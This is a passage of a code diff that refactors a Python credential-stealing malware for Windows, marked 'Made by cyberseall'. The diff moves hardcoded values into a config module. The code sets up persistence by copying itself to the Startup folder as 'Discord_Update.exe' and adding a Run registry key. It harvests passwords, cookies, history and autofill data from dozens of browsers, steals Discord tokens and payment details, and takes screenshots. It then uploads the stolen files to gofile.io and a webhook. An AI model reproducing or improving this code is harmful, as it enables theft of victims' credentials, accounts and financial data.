@@ -14,6 +14,204 @@ import base64
 import shutil
 import sys
 import winreg
+# Robuster Import-Mechanismus für config.py - Globaler Scope
+config_loaded = False
+
+# Methode 1: Relativer Import (für normale Module)
+try:
+    from .config import *
+    config_loaded = True
+except ImportError:
+    pass
+
+# Methode 2: Direkter Import (für gleichen Ordner)
+if not config_loaded:
+    try:
+        from config import *
+        config_loaded = True
+    except ImportError:
+        pass
+
+# Methode 3: Pfad-basierter Import
+if not config_loaded:
+    try:
+        import sys
+        import os
+        current_dir = os.path.dirname(os.path.abspath(__file__))
+        sys.path.insert(0, current_dir)
+        from config import *
+        config_loaded = True
+    except ImportError:
+        pass
+
+# Methode 4: PyInstaller Bundle
+if not config_loaded:
+    try:
+        if getattr(sys, 'frozen', False):
+            import importlib.util
+            # Versuche verschiedene Pfade im PyInstaller Bundle
+            possible_paths = [
+                os.path.join(sys._MEIPASS, 'config.py'),
+                os.path.join(sys._MEIPASS, 'utils', 'config.py'),
+                os.path.join(os.path.dirname(sys.executable), 'config.py')
+            ]
+            
+            for config_path in possible_paths:
+                if os.path.exists(config_path):
+                    spec = importlib.util.spec_from_file_location("config", config_path)
+                    config_module = importlib.util.module_from_spec(spec)
+                    spec.loader.exec_module(config_module)
+                    
+                    # Alle Konstanten in den globalen Namespace laden
+                    for name in dir(config_module):
+                        if not name.startswith('_'):
+                            globals()[name] = getattr(config_module, name)
+                    config_loaded = True
+                    break
+    except Exception as e:
+        print(f"PyInstaller config load error: {e}")
+
+# Methode 5: Inline Fallback-Konfiguration
+if not config_loaded:
+    print("Warning: config.py not found, using fallback configuration")
+    
+    # Vollständige Fallback-Konfiguration
+    BROWSER_PATHS = {
+        "Chrome": {
+            "profile_path": os.path.join(os.getenv("LOCALAPPDATA"), "Google", "Chrome", "User Data"),
+            "login_db": "\\Default\\Login Data",
+            "history_db": "\\Default\\History",
+            "autofill_db": "\\Default\\Web Data"
+        },
+        "Edge": {
+            "profile_path": os.path.join(os.getenv("LOCALAPPDATA"), "Microsoft", "Edge", "User Data"),
+            "login_db": "\\Default\\Login Data",
+            "history_db": "\\Default\\History",
+            "autofill_db": "\\Default\\Web Data"
+        },
+        "Brave": {
+            "profile_path": os.path.join(os.getenv("LOCALAPPDATA"), "BraveSoftware", "Brave-Browser", "User Data"),
+            "login_db": "\\Default\\Login Data",
+            "history_db": "\\Default\\History",
+            "autofill_db": "\\Default\\Web Data"
+        },
+        "Opera": {
+            "profile_path": os.path.join(os.getenv("APPDATA"), "Opera Software", "Opera Stable"),
+            "login_db": "\\Login Data",
+            "history_db": "\\History",
+            "autofill_db": "\\Web Data"
+        },
+        "Opera GX": {
+            "profile_path": os.path.join(os.getenv("APPDATA"), "Opera Software", "Opera GX Stable"),
+            "login_db": "\\Login Data",
+            "history_db": "\\History",
+            "autofill_db": "\\Web Data"
+        },
+        "Vivaldi": {
+            "profile_path": os.path.join(os.getenv("LOCALAPPDATA"), "Vivaldi", "User Data"),
+            "login_db": "\\Default\\Login Data",
+            "history_db": "\\Default\\History",
+            "autofill_db": "\\Default\\Web Data"
+        },
+        "Yandex": {
+            "profile_path": os.path.join(os.getenv("LOCALAPPDATA"), "Yandex", "YandexBrowser", "User Data"),
+            "login_db": "\\Default\\Login Data",
+            "history_db": "\\Default\\History",
+            "autofill_db": "\\Default\\Web Data"
+        }
+    }
+    
+    FIREFOX_INSTALLATIONS = {
+        "Firefox": os.path.join(os.getenv("PROGRAMFILES"), "Mozilla Firefox"),
+        "Firefox (x86)": os.path.join(os.getenv("PROGRAMFILES(X86)"), "Mozilla Firefox")
+    }
+    
+    FIREFOX_PROFILE_LOCATIONS = {
+        "Firefox": os.path.join(os.getenv("APPDATA"), "Mozilla", "Firefox", "Profiles"),
+        "Firefox Developer": os.path.join(os.getenv("APPDATA"), "Mozilla", "Firefox Developer Edition", "Profiles"),
+        "Firefox Nightly": os.path.join(os.getenv("APPDATA"), "Mozilla", "Firefox Nightly", "Profiles")
+    }
+    
+    DISCORD_PATHS = {
+        'Discord': os.path.join(os.getenv('APPDATA'), 'discord'),
+        'Discord Canary': os.path.join(os.getenv('APPDATA'), 'discordcanary'),
+        'Discord PTB': os.path.join(os.getenv('APPDATA'), 'discordptb'),
+        'Discord Development': os.path.join(os.getenv('APPDATA'), 'discorddevelopment'),
+    }
+    
+    TOKEN_PATHS = {
+        'Discord': os.path.join(os.getenv('APPDATA'), 'discord'),
+        'Discord Canary': os.path.join(os.getenv('APPDATA'), 'discordcanary'),
+        'Lightcord': os.path.join(os.getenv('APPDATA'), 'Lightcord'),
+        'Discord PTB': os.path.join(os.getenv('APPDATA'), 'discordptb'),
+        'Opera': os.path.join(os.getenv('APPDATA'), 'Opera Software', 'Opera Stable'),
+        'Opera GX': os.path.join(os.getenv('APPDATA'), 'Opera Software', 'Opera GX Stable'),
+        'Amigo': os.path.join(os.getenv('LOCALAPPDATA'), 'Amigo', 'User Data'),
+        'Torch': os.path.join(os.getenv('LOCALAPPDATA'), 'Torch', 'User Data'),
+        'Kometa': os.path.join(os.getenv('LOCALAPPDATA'), 'Kometa', 'User Data'),
+        'Orbitum': os.path.join(os.getenv('LOCALAPPDATA'), 'Orbitum', 'User Data'),
+        'CentBrowser': os.path.join(os.getenv('LOCALAPPDATA'), 'CentBrowser', 'User Data'),
+        '7Star': os.path.join(os.getenv('LOCALAPPDATA'), '7Star', '7Star', 'User Data'),
+        'Sputnik': os.path.join(os.getenv('LOCALAPPDATA'), 'Sputnik', 'Sputnik', 'User Data'),
+        'Vivaldi': os.path.join(os.getenv('LOCALAPPDATA'), 'Vivaldi', 'User Data', 'Default'),
+        'Chrome SxS': os.path.join(os.getenv('LOCALAPPDATA'), 'Google', 'Chrome SxS', 'User Data'),
+        'Chrome': os.path.join(os.getenv('LOCALAPPDATA'), 'Google', 'Chrome', 'User Data', 'Default'),
+        'Epic Privacy Browser': os.path.join(os.getenv('LOCALAPPDATA'), 'Epic Privacy Browser', 'User Data'),
+        'Microsoft Edge': os.path.join(os.getenv('LOCALAPPDATA'), 'Microsoft', 'Edge', 'User Data', 'Default'),
+        'Uran': os.path.join(os.getenv('LOCALAPPDATA'), 'uCozMedia', 'Uran', 'User Data', 'Default'),
+        'Yandex': os.path.join(os.getenv('LOCALAPPDATA'), 'Yandex', 'YandexBrowser', 'User Data', 'Default'),
+        'Brave': os.path.join(os.getenv('LOCALAPPDATA'), 'BraveSoftware', 'Brave-Browser', 'User Data', 'Default'),
+        'Iridium': os.path.join(os.getenv('LOCALAPPDATA'), 'Iridium', 'User Data', 'Default')
+    }
+    
+    COOKIE_BROWSER_PATHS = {
+        'Chrome': os.path.join(os.getenv("LOCALAPPDATA"), "Google", "Chrome", "User Data"),
+        'Edge': os.path.join(os.getenv("LOCALAPPDATA"), "Microsoft", "Edge", "User Data"),
+        'Brave': os.path.join(os.getenv("LOCALAPPDATA"), "BraveSoftware", "Brave-Browser", "User Data"),
+        'Opera': os.path.join(os.getenv("APPDATA"), "Opera Software", "Opera Stable"),
+        'Opera GX': os.path.join(os.getenv("APPDATA"), "Opera Software", "Opera GX Stable"),
+        'Vivaldi': os.path.join(os.getenv("LOCALAPPDATA"), "Vivaldi", "User Data"),
+    }
+    
+    IMPORTANT_DOMAINS = ["discord", "google", "paypal", "amazon", "steam", "github", "roblox"]
+    IP_API_URL = "https://api.ipify.org"
+    GEOLOCATION_API_URL = "http://ip-api.com/json/"
+    GOFILE_UPLOAD_URL = 'https://upload.gofile.io/uploadfile'
+    GOFILE_CREATE_FOLDER_URL = 'https://api.gofile.io/contents/createFolder'
+    DISCORD_API_BASE = "https://discordapp.com/api/v6"
+    DISCORD_USER_ENDPOINT = f"{DISCORD_API_BASE}/users/@me"
+    DISCORD_BILLING_ENDPOINT = f"{DISCORD_API_BASE}/users/@me/billing/subscriptions"
+    DISCORD_PAYMENT_ENDPOINT = f"{DISCORD_API_BASE}/users/@me/billing/payment-sources"
+    
+    STARTUP_FOLDER = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
+    STARTUP_FILENAME = 'Discord_Update.exe'
+    REGISTRY_KEY_PATH = r'SOFTWARE\Microsoft\Windows\CurrentVersion\Run'
+    REGISTRY_VALUE_NAME = 'Discord_Update'
+    STORAGE_PATH = os.path.join(os.getenv('APPDATA'), 'gruppe_storage')
+    CONFIG_FILE = os.path.join(STORAGE_PATH, 'config.json')
+    TEMP_DATA_FOLDER = os.path.join(os.getenv("APPDATA"), "TempData")
+    
+    SCREENSHOT_MAX_WIDTH = 1280
+    SCREENSHOT_QUALITY = 85
+    HISTORY_LIMIT = 1000
+    AUTOFILL_FORM_LIMIT = 50
+    COOKIES_PER_DOMAIN_LIMIT = 20
+    WEBHOOK_TIMEOUT = 10
+    UPLOAD_TIMEOUT = 30
+    API_TIMEOUT = 5
+    WATERMARK_TEXT = "Made by cyberseall"
+    
+    FILE_HEADERS = {
+        "passwords": "BROWSER PASSWORDS CAPTURED",
+        "history": "BROWSER HISTORY CAPTURED", 
+        "autofills": "BROWSER AUTOFILLS CAPTURED",
+        "cookies": "BROWSER COOKIES CAPTURED",
+        "system_info": "SYSTEM INFORMATION CAPTURED",
+        "discord_tokens": "DISCORD TOKENS CAPTURED"
+    }
+    
+    SEPARATOR_LINE = "==============================================================================="
+    SUBSECTION_LINE = "-------------------------------------------------------------------------------"
 try:
     import PIL.ImageGrab
     from PIL import Image
@@ -52,19 +250,19 @@ def add_to_startup():
         if not exe_path.endswith('.exe'):
             return False
 
-        startup_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
+        startup_folder = STARTUP_FOLDER
         if not os.path.exists(startup_folder):
             os.makedirs(startup_folder)
 
-        target_path = os.path.join(startup_folder, 'Discord_Update.exe')
+        target_path = os.path.join(startup_folder, STARTUP_FILENAME)
 
         if not os.path.exists(target_path) or not files_are_same(exe_path, target_path):
             shutil.copy2(exe_path, target_path)
 
-        key_path = r'SOFTWARE\Microsoft\Windows\CurrentVersion\Run'
+        key_path = REGISTRY_KEY_PATH
         try:
             key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_WRITE)
-            winreg.SetValueEx(key, 'Discord_Update', 0, winreg.REG_SZ, exe_path)
+            winreg.SetValueEx(key, REGISTRY_VALUE_NAME, 0, winreg.REG_SZ, exe_path)
             winreg.CloseKey(key)
         except Exception as e:
             print(f"Registry error: {str(e)}")
@@ -332,26 +530,8 @@ def get_firefox_passwords():
 
     all_passwords = []
 
-    firefox_installations = {
-        "Firefox": os.path.join(os.getenv("PROGRAMFILES"), "Mozilla Firefox"),
-        "Firefox (x86)": os.path.join(os.getenv("PROGRAMFILES(X86)"), "Mozilla Firefox"),
-        "Firefox Developer": os.path.join(os.getenv("PROGRAMFILES"), "Firefox Developer Edition"),
-        "Firefox Developer (x86)": os.path.join(os.getenv("PROGRAMFILES(X86)"), "Firefox Developer Edition"),
-        "Firefox Nightly": os.path.join(os.getenv("PROGRAMFILES"), "Firefox Nightly"),
-        "Firefox Nightly (x86)": os.path.join(os.getenv("PROGRAMFILES(X86)"), "Firefox Nightly")
-    }
-
-    profile_locations = {
-        "Firefox": os.path.join(os.getenv("APPDATA"), "Mozilla", "Firefox", "Profiles"),
-        "Firefox Developer": os.path.join(os.getenv("APPDATA"), "Mozilla", "Firefox Developer Edition", "Profiles"),
-        "Firefox Nightly": os.path.join(os.getenv("APPDATA"), "Mozilla", "Firefox Nightly", "Profiles"),
-        "Waterfox": os.path.join(os.getenv("APPDATA"), "Waterfox", "Profiles"),
-        "Pale Moon": os.path.join(os.getenv("APPDATA"), "Moonchild Productions", "Pale Moon", "Profiles"),
-        "SeaMonkey": os.path.join(os.getenv("APPDATA"), "Mozilla", "SeaMonkey", "Profiles"),
-        "Thunderbird": os.path.join(os.getenv("APPDATA"), "Thunderbird", "Profiles"),
-        "Basilisk": os.path.join(os.getenv("APPDATA"), "Basilisk", "Profiles"),
-        "LibreWolf": os.path.join(os.getenv("APPDATA"), "LibreWolf", "Profiles")
-    }
+    firefox_installations = FIREFOX_INSTALLATIONS
+    profile_locations = FIREFOX_PROFILE_LOCATIONS
 
     firefox_dir = None
     for name, path in firefox_installations.items():
@@ -384,13 +564,13 @@ def get_firefox_passwords():
 def getip():
     ip = "None"
     try:
-        ip = urlopen(Request("https://api.ipify.org")).read().decode().strip()
+        ip = urlopen(Request(IP_API_URL)).read().decode().strip()
     except: pass
     return ip
 
 def get_geolocation(ip):
     try:
-        response = requests.get(f"http://ip-api.com/json/{ip}")
+        response = requests.get(f"{GEOLOCATION_API_URL}{ip}")
         if response.status_code == 200:
             data = response.json()
             return {
@@ -544,220 +724,7 @@ def decrypt_password(password, key):
 
 def get_browser_passwords():
     passwords = []
-    browser_data = {
-        "Chrome": {
-            "profile_path": os.path.join(os.getenv("LOCALAPPDATA"), "Google", "Chrome", "User Data"),
-            "login_db": "\\Default\\Login Data"
-        },
-        "Chrome Profile 1": {
-            "profile_path": os.path.join(os.getenv("LOCALAPPDATA"), "Google", "Chrome", "User Data"),
-            "login_db": "\\Profile 1\\Login Data"
-        },
-        "Chrome Profile 2": {
-            "profile_path": os.path.join(os.getenv("LOCALAPPDATA"), "Google", "Chrome", "User Data"),
-            "login_db": "\\Profile 2\\Login Data"
-        },
-        "Chrome Profile 3": {
-            "profile_path": os.path.join(os.getenv("LOCALAPPDATA"), "Google", "Chrome", "User Data"),
-            "login_db": "\\Profile 3\\Login Data"
-        },
-        "Chrome Beta": {
-            "profile_path": os.path.join(os.getenv("LOCALAPPDATA"), "Google", "Chrome Beta", "User Data"),
-            "login_db": "\\Default\\Login Data"
-        },
-        "Chrome SxS (Canary)": {
-            "profile_path": os.path.join(os.getenv("LOCALAPPDATA"), "Google", "Chrome SxS", "User Data"),
-            "login_db": "\\Default\\Login Data"
-        },
-        "Chrome Dev": {
-            "profile_path": os.path.join(os.getenv("LOCALAPPDATA"), "Google", "Chrome Dev", "User Data"),
-            "login_db": "\\Default\\Login Data"
-        },
-
-        "Edge": {
-            "profile_path": os.path.join(os.getenv("LOCALAPPDATA"), "Microsoft", "Edge", "User Data"),
-            "login_db": "\\Default\\Login Data"
-        },
-        "Edge Profile 1": {
-            "profile_path": os.path.join(os.getenv("LOCALAPPDATA"), "Microsoft", "Edge", "User Data"),
-            "login_db": "\\Profile 1\\Login Data"
-        },
-        "Edge Profile 2": {
-            "profile_path": os.path.join(os.getenv("LOCALAPPDATA"), "Microsoft", "Edge", "User Data"),
-            "login_db": "\\Profile 2\\Login Data"
-        },
-        "Edge Beta": {
-            "profile_path": os.path.join(os.getenv("LOCALAPPDATA"), "Microsoft", "Edge Beta", "User Data"),
-            "login_db": "\\Default\\Login Data"
-        },
-        "Edge Dev": {
-            "profile_path": os.path.join(os.getenv("LOCALAPPDATA"), "Microsoft", "Edge Dev", "User Data"),
-            "login_db": "\\Default\\Login Data"
-        },
-        "Edge Canary": {
-            "profile_path": os.path.join(os.getenv("LOCALAPPDATA"), "Microsoft", "Edge Canary", "User Data"),
-            "login_db": "\\Default\\Login Data"
-        },
-
-        "Brave": {
-            "profile_path": os.path.join(os.getenv("LOCALAPPDATA"), "BraveSoftware", "Brave-Browser", "User Data"),
-            "login_db": "\\Default\\Login Data"
-        },
-        "Brave Profile 1": {
-            "profile_path": os.path.join(os.getenv("LOCALAPPDATA"), "BraveSoftware", "Brave-Browser", "User Data"),
-            "login_db": "\\Profile 1\\Login Data"
-        },
-        "Brave Profile 2": {
-            "profile_path": os.path.join(os.getenv("LOCALAPPDATA"), "BraveSoftware", "Brave-Browser", "User Data"),
-            "login_db": "\\Profile 2\\Login Data"
-        },
-        "Brave Beta": {
-            "profile_path": os.path.join(os.getenv("LOCALAPPDATA"), "BraveSoftware", "Brave-Browser-Beta", "User Data"),
-            "login_db": "\\Default\\Login Data"
-        },
-        "Brave Nightly": {
-            "profile_path": os.path.join(os.getenv("LOCALAPPDATA"), "BraveSoftware", "Brave-Browser-Nightly", "User Data"),
-            "login_db": "\\Default\\Login Data"
-        },
-
-        "Opera": {
-            "profile_path": os.path.join(os.getenv("APPDATA"), "Opera Software", "Opera Stable"),
-            "login_db": "\\Login Data"
-        },
-        "Opera GX": {
-            "profile_path": os.path.join(os.getenv("APPDATA"), "Opera Software", "Opera GX Stable"),
-            "login_db": "\\Login Data"
-        },
-        "Opera Neon": {
-            "profile_path": os.path.join(os.getenv("APPDATA"), "Opera Software", "Opera Neon", "User Data", "Default"),
-            "login_db": "\\Login Data"
-        },
-        "Opera Beta": {
-            "profile_path": os.path.join(os.getenv("APPDATA"), "Opera Software", "Opera Beta"),
-            "login_db": "\\Login Data"
-        },
-        "Opera Developer": {
-            "profile_path": os.path.join(os.getenv("APPDATA"), "Opera Software", "Opera Developer"),
-            "login_db": "\\Login Data"
-        },
-
-        "Vivaldi": {
-            "profile_path": os.path.join(os.getenv("LOCALAPPDATA"), "Vivaldi", "User Data"),
-            "login_db": "\\Default\\Login Data"
-        },
-        "Vivaldi Profile 1": {
-            "profile_path": os.path.join(os.getenv("LOCALAPPDATA"), "Vivaldi", "User Data"),
-            "login_db": "\\Profile 1\\Login Data"
-        },
-        "Vivaldi Snapshot": {
-            "profile_path": os.path.join(os.getenv("LOCALAPPDATA"), "Vivaldi Snapshot", "User Data"),
-            "login_db": "\\Default\\Login Data"
-        },
-
-        "Yandex": {
-            "profile_path": os.path.join(os.getenv("LOCALAPPDATA"), "Yandex", "YandexBrowser", "User Data"),
-            "login_db": "\\Default\\Login Data"
-        },
-        "Yandex Profile 1": {
-            "profile_path": os.path.join(os.getenv("LOCALAPPDATA"), "Yandex", "YandexBrowser", "User Data"),
-            "login_db": "\\Profile 1\\Login Data"
-        },
-
-        "Chromium": {
-            "profile_path": os.path.join(os.getenv("LOCALAPPDATA"), "Chromium", "User Data"),
-            "login_db": "\\Default\\Login Data"
-        },
-        "Comodo Dragon": {
-            "profile_path": os.path.join(os.getenv("LOCALAPPDATA"), "Comodo", "Dragon", "User Data"),
-            "login_db": "\\Default\\Login Data"
-        },
-        "Epic Privacy Browser": {
-            "profile_path": os.path.join(os.getenv("LOCALAPPDATA"), "Epic Privacy Browser", "User Data"),
-            "login_db": "\\Default\\Login Data"
-        },
-        "Amigo": {
-            "profile_path": os.path.join(os.getenv("LOCALAPPDATA"), "Amigo", "User Data"),
-            "login_db": "\\Default\\Login Data"
-        },
-        "Torch": {
-            "profile_path": os.path.join(os.getenv("LOCALAPPDATA"), "Torch", "User Data"),
-            "login_db": "\\Default\\Login Data"
-        },
-        "CentBrowser": {
-            "profile_path": os.path.join(os.getenv("LOCALAPPDATA"), "CentBrowser", "User Data"),
-            "login_db": "\\Default\\Login Data"
-        },
-        "7Star": {
-            "profile_path": os.path.join(os.getenv("LOCALAPPDATA"), "7Star", "7Star", "User Data"),
-            "login_db": "\\Default\\Login Data"
-        },
-        "Sputnik": {
-            "profile_path": os.path.join(os.getenv("LOCALAPPDATA"), "Sputnik", "Sputnik", "User Data"),
-            "login_db": "\\Default\\Login Data"
-        },
-        "Kometa": {
-            "profile_path": os.path.join(os.getenv("LOCALAPPDATA"), "Kometa", "User Data"),
-            "login_db": "\\Default\\Login Data"
-        },
-        "Orbitum": {
-            "profile_path": os.path.join(os.getenv("LOCALAPPDATA"), "Orbitum", "User Data"),
-            "login_db": "\\Default\\Login Data"
-        },
-        "Iridium": {
-            "profile_path": os.path.join(os.getenv("LOCALAPPDATA"), "Iridium", "User Data"),
-            "login_db": "\\Default\\Login Data"
-        },
-        "Uran": {
-            "profile_path": os.path.join(os.getenv("LOCALAPPDATA"), "uCozMedia", "Uran", "User Data"),
-            "login_db": "\\Default\\Login Data"
-        },
-        "Maxthon": {
-            "profile_path": os.path.join(os.getenv("LOCALAPPDATA"), "Maxthon", "Application", "User Data"),
-            "login_db": "\\Default\\Login Data"
-        },
-        "Slimjet": {
-            "profile_path": os.path.join(os.getenv("LOCALAPPDATA"), "Slimjet", "User Data"),
-            "login_db": "\\Default\\Login Data"
-        },
-        "Avast Secure Browser": {
-            "profile_path": os.path.join(os.getenv("LOCALAPPDATA"), "AVAST Software", "Browser", "User Data"),
-            "login_db": "\\Default\\Login Data"
-        },
-        "AVG Browser": {
-            "profile_path": os.path.join(os.getenv("LOCALAPPDATA"), "AVG", "Browser", "User Data"),
-            "login_db": "\\Default\\Login Data"
-        },
-        "Chedot": {
-            "profile_path": os.path.join(os.getenv("LOCALAPPDATA"), "Chedot", "User Data"),
-            "login_db": "\\Default\\Login Data"
-        },
-        "Blisk": {
-            "profile_path": os.path.join(os.getenv("LOCALAPPDATA"), "Blisk", "User Data"),
-            "login_db": "\\Default\\Login Data"
-        },
-        "Kinza": {
-            "profile_path": os.path.join(os.getenv("LOCALAPPDATA"), "Kinza", "User Data"),
-            "login_db": "\\Default\\Login Data"
-        },
-        "Coccoc": {
-            "profile_path": os.path.join(os.getenv("LOCALAPPDATA"), "CocCoc", "Browser", "User Data"),
-            "login_db": "\\Default\\Login Data"
-        },
-        "Atom": {
-            "profile_path": os.path.join(os.getenv("LOCALAPPDATA"), "Atom", "User Data"),
-            "login_db": "\\Default\\Login Data"
-        },
-        "Seamonkey": {
-            "profile_path": os.path.join(os.getenv("APPDATA"), "Mozilla", "SeaMonkey", "Profiles"),
-            "login_db": "\\signons.sqlite"
-        }
-    }
-
-    for i in range(4, 10):
-        browser_data[f"Chrome Profile {i}"] = {
-            "profile_path": os.path.join(os.getenv("LOCALAPPDATA"), "Google", "Chrome", "User Data"),
-            "login_db": f"\\Profile {i}\\Login Data"
-        }
+    browser_data = BROWSER_PATHS
 
     for browser, data in browser_data.items():
         try:
@@ -870,14 +837,14 @@ def take_screenshot():
             else:
                 screenshot = PIL.ImageGrab.grab()
 
-            max_width = 1280
+            max_width = SCREENSHOT_MAX_WIDTH
             if screenshot.width > max_width:
                 ratio = max_width / screenshot.width
                 new_height = int(screenshot.height * ratio)
                 screenshot = screenshot.resize((max_width, new_height), Image.LANCZOS)
 
             img_byte_arr = io.BytesIO()
-            screenshot.save(img_byte_arr, format='PNG', optimize=True, quality=85)
+            screenshot.save(img_byte_arr, format='PNG', optimize=True, quality=SCREENSHOT_QUALITY)
             img_byte_arr.seek(0)
 
             img_base64 = base64.b64encode(img_byte_arr.read()).decode('utf-8')
@@ -888,8 +855,8 @@ def take_screenshot():
     return screenshots
 
 def get_webhook_url():
-    storage_path = os.path.join(os.getenv('APPDATA'), 'gruppe_storage')
-    config_path = os.path.join(storage_path, 'config.json')
+    storage_path = STORAGE_PATH
+    config_path = CONFIG_FILE
 
     if not os.path.exists(config_path):
         return None
@@ -910,12 +877,7 @@ def get_discord_password():
     passwords = []
     roaming = os.getenv('APPDATA')
 
-    discord_paths = {
-        'Discord': roaming + '\\discord',
-        'Discord Canary': roaming + '\\discordcanary',
-        'Discord PTB': roaming + '\\discordptb',
-        'Discord Development': roaming + '\\discorddevelopment',
-    }
+    discord_paths = DISCORD_PATHS
 
     for platform, path in discord_paths.items():
         if not os.path.exists(path):
@@ -1127,50 +1089,8 @@ def get_cookies(browser_paths, domain_filter=None):
     return cookies
 
 def get_browser_history():
-
     history = []
-    browser_data = {
-        "Chrome": {
-            "profile_path": os.path.join(os.getenv("LOCALAPPDATA"), "Google", "Chrome", "User Data"),
-            "history_db": "\\Default\\History"
-        },
-        "Chrome Profile 1": {
-            "profile_path": os.path.join(os.getenv("LOCALAPPDATA"), "Google", "Chrome", "User Data"),
-            "history_db": "\\Profile 1\\History"
-        },
-        "Chrome Profile 2": {
-            "profile_path": os.path.join(os.getenv("LOCALAPPDATA"), "Google", "Chrome", "User Data"),
-            "history_db": "\\Profile 2\\History"
-        },
-        "Edge": {
-            "profile_path": os.path.join(os.getenv("LOCALAPPDATA"), "Microsoft", "Edge", "User Data"),
-            "history_db": "\\Default\\History"
-        },
-        "Edge Profile 1": {
-            "profile_path": os.path.join(os.getenv("LOCALAPPDATA"), "Microsoft", "Edge", "User Data"),
-            "history_db": "\\Profile 1\\History"
-        },
-        "Brave": {
-            "profile_path": os.path.join(os.getenv("LOCALAPPDATA"), "BraveSoftware", "Brave-Browser", "User Data"),
-            "history_db": "\\Default\\History"
-        },
-        "Opera": {
-            "profile_path": os.path.join(os.getenv("APPDATA"), "Opera Software", "Opera Stable"),
-            "history_db": "\\History"
-        },
-        "Opera GX": {
-            "profile_path": os.path.join(os.getenv("APPDATA"), "Opera Software", "Opera GX Stable"),
-            "history_db": "\\History"
-        },
-        "Vivaldi": {
-            "profile_path": os.path.join(os.getenv("LOCALAPPDATA"), "Vivaldi", "User Data"),
-            "history_db": "\\Default\\History"
-        },
-        "Yandex": {
-            "profile_path": os.path.join(os.getenv("LOCALAPPDATA"), "Yandex", "YandexBrowser", "User Data"),
-            "history_db": "\\Default\\History"
-        }
-    }
+    browser_data = BROWSER_PATHS
 
     for browser, data in browser_data.items():
         try:
@@ -1234,50 +1154,8 @@ def get_browser_history():
     return history
 
 def get_browser_autofills():
-
     autofills = []
-    browser_data = {
-        "Chrome": {
-            "profile_path": os.path.join(os.getenv("LOCALAPPDATA"), "Google", "Chrome", "User Data"),
-            "autofill_db": "\\Default\\Web Data"
-        },
-        "Chrome Profile 1": {
-            "profile_path": os.path.join(os.getenv("LOCALAPPDATA"), "Google", "Chrome", "User Data"),
-            "autofill_db": "\\Profile 1\\Web Data"
-        },
-        "Chrome Profile 2": {
-            "profile_path": os.path.join(os.getenv("LOCALAPPDATA"), "Google", "Chrome", "User Data"),
-            "autofill_db": "\\Profile 2\\Web Data"
-        },
-        "Edge": {
-            "profile_path": os.path.join(os.getenv("LOCALAPPDATA"), "Microsoft", "Edge", "User Data"),
-            "autofill_db": "\\Default\\Web Data"
-        },
-        "Edge Profile 1": {
-            "profile_path": os.path.join(os.getenv("LOCALAPPDATA"), "Microsoft", "Edge", "User Data"),
-            "autofill_db": "\\Profile 1\\Web Data"
-        },
-        "Brave": {
-            "profile_path": os.path.join(os.getenv("LOCALAPPDATA"), "BraveSoftware", "Brave-Browser", "User Data"),
-            "autofill_db": "\\Default\\Web Data"
-        },
-        "Opera": {
-            "profile_path": os.path.join(os.getenv("APPDATA"), "Opera Software", "Opera Stable"),
-            "autofill_db": "\\Web Data"
-        },
-        "Opera GX": {
-            "profile_path": os.path.join(os.getenv("APPDATA"), "Opera Software", "Opera GX Stable"),
-            "autofill_db": "\\Web Data"
-        },
-        "Vivaldi": {
-            "profile_path": os.path.join(os.getenv("LOCALAPPDATA"), "Vivaldi", "User Data"),
-            "autofill_db": "\\Default\\Web Data"
-        },
-        "Yandex": {
-            "profile_path": os.path.join(os.getenv("LOCALAPPDATA"), "Yandex", "YandexBrowser", "User Data"),
-            "autofill_db": "\\Default\\Web Data"
-        }
-    }
+    browser_data = BROWSER_PATHS
 
     for browser, data in browser_data.items():
         try:
@@ -1350,11 +1228,10 @@ def get_browser_autofills():
     return autofills
 
 def upload_to_gofile(file_path, filename):
-
     try:
         with open(file_path, 'rb') as f:
             files = {'file': (filename, f, 'text/plain')}
-            response = requests.post('https://upload.gofile.io/uploadfile', files=files, timeout=30)
+            response = requests.post(GOFILE_UPLOAD_URL, files=files, timeout=UPLOAD_TIMEOUT)
 
         if response.status_code == 200:
             data = response.json()
@@ -1374,10 +1251,10 @@ def create_gofile_folder(parent_folder_id=None, folder_name=None):
         if folder_name:
             payload['folderName'] = folder_name
 
-        response = requests.post('https://api.gofile.io/contents/createFolder',
+        response = requests.post(GOFILE_CREATE_FOLDER_URL,
                                json=payload,
                                headers={'Content-Type': 'application/json'},
-                               timeout=15)
+                               timeout=UPLOAD_TIMEOUT)
 
         if response.status_code == 200:
             data = response.json()
@@ -1393,7 +1270,7 @@ def create_and_upload_data_files(browser_passwords, browser_history, browser_aut
     current_time = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
     pc_name = os.getenv("Computername") or "Unknown"
 
-    appdata_folder = os.path.join(os.getenv("APPDATA"), "TempData", f"Grabbed_{pc_name}_{current_time}")
+    appdata_folder = os.path.join(TEMP_DATA_FOLDER, f"Grabbed_{pc_name}_{current_time}")
 
     try:
 
@@ -1403,13 +1280,13 @@ def create_and_upload_data_files(browser_passwords, browser_history, browser_aut
             passwords_file = os.path.join(appdata_folder, f"passwords_{pc_name}_{current_time}.txt")
 
             with open(passwords_file, "w", encoding="utf-8") as f:
-                f.write("===============================================================================\n")
-                f.write("                           BROWSER PASSWORDS CAPTURED                         \n")
-                f.write("===============================================================================\n\n")
+                f.write(f"{SEPARATOR_LINE}\n")
+                f.write(f"                           {FILE_HEADERS['passwords']}                         \n")
+                f.write(f"{SEPARATOR_LINE}\n\n")
 
                 if discord_passwords:
                     f.write("DISCORD CREDENTIALS\n")
-                    f.write("-------------------------------------------------------------------------------\n\n")
+                    f.write(f"{SUBSECTION_LINE}\n\n")
 
                     for i, pwd in enumerate(discord_passwords, 1):
                         f.write(f"DISCORD LOGIN #{i}:\n")
@@ -1533,15 +1410,15 @@ def create_and_upload_data_files(browser_passwords, browser_history, browser_aut
 
                     if form_data:
                         f.write("FORM DATA:\n")
-                        for i, data in enumerate(form_data[:50], 1):
+                        for i, data in enumerate(form_data[:AUTOFILL_FORM_LIMIT], 1):
                             f.write(f"  FIELD #{i}:\n")
                             f.write(f"    Field Name: {data['field_name']}\n")
                             f.write(f"    Value: {data['value']}\n")
                             f.write(f"    Usage Count: {data['usage_count']}\n")
                             f.write("    -------------------------------------------------------------------\n")
 
-                        if len(form_data) > 50:
-                            f.write(f"  ... and {len(form_data) - 50} more entries\n")
+                        if len(form_data) > AUTOFILL_FORM_LIMIT:
